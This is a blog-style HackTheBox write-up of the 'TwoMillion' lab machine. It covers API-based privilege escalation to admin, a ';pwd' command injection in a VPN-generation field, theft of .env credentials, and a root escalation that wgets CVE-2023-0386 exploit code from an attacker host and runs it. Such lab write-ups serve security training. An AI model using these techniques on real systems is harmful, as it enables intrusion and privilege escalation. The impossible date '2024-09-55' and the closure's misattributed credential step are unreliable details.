---
title: "Two Million"
date: 2024-09-55
draft: false
summary: "Writeup for Two Million HackTheBox challenge."
tags: ["linux", "api", "command injection", "kernel exploit"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/twomillion/cover.webp"
  caption: "Two Million HackTheBox Challenge"
  alt: "Two Million cover"
platform: "HackTheBox"
---

TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. This challenge has 2 flags.
<!--more-->
To access the machine, click on the link given below:
- https://www.hackthebox.com/machines/twomillion

## Reconnaissance

I mapped the IP to the `2million.htb` domain by editing my **`/etc/hosts`** file. Then, I performed an **nmap** scan to find information about open ports and services running on the target:

```shell
nmap -A IP -oN twomillion.nmap
```

| PORT | SERVICE |
| ---- | ------- |
| 22   | ssh     |
| 80   | http    |

![](https://cdn.ziomsec.com/twomillion/1.webp)

## Initial Foothold

Since the target was running an http server, I accessed it through my browser and found **HackTheBox**'s old landing page.

![](https://cdn.ziomsec.com/twomillion/2.webp)

Inspecting the page source revealed an endpoint called `/invite`.

![](https://cdn.ziomsec.com/twomillion/3.webp)

I used the **network** tab from the browser's developer options to inspect which files were being loaded by refreshing the page. Here, I found a **javascript** file that had something to do with `invite`.

![](https://cdn.ziomsec.com/twomillion/4.webp)

This file contained obsfuscated javascript. Deobfuscating it revealed api endpoints to verify/generate invite codes. 

- Deobfuscated javascript:
```javascript
function verifyInviteCode(code) {
    var formData = {"code": code};
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite',
        success: function(response) {
            console.log(response);
        },
        error: function(response) {
            console.log(response);
        }
    });
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/generate/how/to',
        success: function(response) {
            console.log(response);
        },
        error: function(response) {
            console.log(response);
        }
    });
}
```

I then used curl to try and generate a code by making a request to `/api/v1/invite/generate`

```shell
curl -X POST http://2million.htb/api/v1/invite/generate
```

![](https://cdn.ziomsec.com/twomillion/5.webp)

This code was base64 encoded, so I decoded it using the **base64** command.

```shell
echo 'RExSQlctRDU5S08tTlVXWUEtRlpZOEI=' | base64 -d
```

![](https://cdn.ziomsec.com/twomillion/6.webp)

Finally, I entered this code on the `/invite` page.

![](https://cdn.ziomsec.com/twomillion/7.webp)

I then registered using some fake credentials.

![](https://cdn.ziomsec.com/twomillion/8.webp)

The page source of `/access` revealed more `api` paths...

![](https://cdn.ziomsec.com/twomillion/9.webp)

To analyze thenm, I turned on **Burp Suite** and made a request to `http://2million.htb/api`.

![](https://cdn.ziomsec.com/twomillion/10.webp)

It returned the version of the API. I then looked inside */api/v1*.

![](https://cdn.ziomsec.com/twomillion/11.webp)

I saw a couple of paths that had *admin* in them. So I tried each one of them. Upon sending a request to `/api/v1/admin/vpn/generate` and `/api/v1/admin/settings/update`, I got a response code of **405**.

![](https://cdn.ziomsec.com/twomillion/12.webp)

![](https://cdn.ziomsec.com/twomillion/13.webp)

This indicated that the **GET** request wasn't allowed for this request. So I tried other requests on both the endpoints. I got a different response in `/api/v1/admin/vpn/generate` when I tried the **POST** method.

![](https://cdn.ziomsec.com/twomillion/14.webp)

I tried different methods on both the endpoints and finally got a status **200** by using **PUT** method on `/api/v1/admin/settings/update`.

![](https://cdn.ziomsec.com/twomillion/15.webp)

I received a response saying "`invalid content-type.`" , so I added a `Content-Type` header to my request with the value **`application/json`**.

![](https://cdn.ziomsec.com/twomillion/16.webp)

I then added the `email` parameter to my request body.

![](https://cdn.ziomsec.com/twomillion/17.webp)

The response mentioned another parameter to be added - `is_admin`. So I added the parameter and forwarded the request to get details about my account. The response revealed I had escalated my privileges to `admin`.

![](https://cdn.ziomsec.com/twomillion/18.webp)

I verified the same using `/api/v1/admin/auth`

![](https://cdn.ziomsec.com/twomillion/19.webp)

I now tried to generate a VPN file as admin by sending a POST request  to `/api/v1/admin/vpn/generate`

![](https://cdn.ziomsec.com/twomillion/20.webp)

I added the missing `username` parameter and forwarded the request.

![](https://cdn.ziomsec.com/twomillion/21.webp)

This returned a status code of *200*. Since the *username* value was being sent as JSON, I checked for command injection vulnerability by adding a command along with the username.

![](https://cdn.ziomsec.com/twomillion/22.webp)

By injecting `;pwd`, I found out the directory I was in.

![](https://cdn.ziomsec.com/twomillion/23.webp)

I viewed the `database.php` file and found the names of some environment variables.

![](https://cdn.ziomsec.com/twomillion/24.webp)

I tried to view all the files in the `/var/www/html` directory and found the hidden `.env` file

![](https://cdn.ziomsec.com/twomillion/25.webp)

I read the file and found user credentials.

![](https://cdn.ziomsec.com/twomillion/26.webp)

I used the username and password to access the machine through **ssh**.

```shell
ssh admin@TARGET
```

![](https://cdn.ziomsec.com/twomillion/27.webp)

I found the first flag in *admin* user's home directory.

![](https://cdn.ziomsec.com/twomillion/28.webp)

## Privilege Escalation

While performing further enumeration, I found an interesting email at `/var/mail`.

```shell
$ cd /var/mail
$ cat admin
```

![](https://cdn.ziomsec.com/twomillion/29.webp)

Since the mail mentioned a kernel CVE, I found my kernel information and looked for CVE's related to it.

```shell
uname -a
```

![](https://cdn.ziomsec.com/twomillion/30.webp)

![](https://cdn.ziomsec.com/twomillion/31.webp)

I looked for ways to exploit this and found this **C** code:
- [https://github.com/xkaneiki/CVE-2023-0386](https://github.com/xkaneiki/CVE-2023-0386).

I checked if **gcc** and **wget** were present.

```shell
$ which gcc
$ which wget
```

![](https://cdn.ziomsec.com/twomillion/32.webp)

II then downloaded the exploit on the target, compiled and executed it:

```shell
$ wget "http://KALI/CVE-2023-0386-master.zip"
$ unzip CVE-2023-0386-master.zip
$ make all
$ ./fuse ./ovlcap/lower ./gc
$ ./exp
```

![](https://cdn.ziomsec.com/twomillion/33.webp)

![](https://cdn.ziomsec.com/twomillion/34.webp)

![](https://cdn.ziomsec.com/twomillion/35.webp)

Finally, I moved into the *root* directory and captured the last flag.

![](https://cdn.ziomsec.com/twomillion/36.webp)

## Closure

Here's a summary of how I captured both the flags:
1. I found the */invite* panel through the source code of the main website and used it to log in as a user.
2. After logging in, I navigated to the */access* tab. Using Burp Suite, I made requests at `/api/v1/admin/settings/update` to give my account *admin* access.
3. I then visited `/api/v1/admin/settings/update` and found the credentials to log in using **ssh**.
4. In the home directory of *admin*, I found the user flag.
5. I discovered a hint on how to escalate my privileges through an email in */var/mail*.
6. I used a kernel exploit to escalate my privileges.
7. Finally, I captured the final flag in the *root* directory.

---
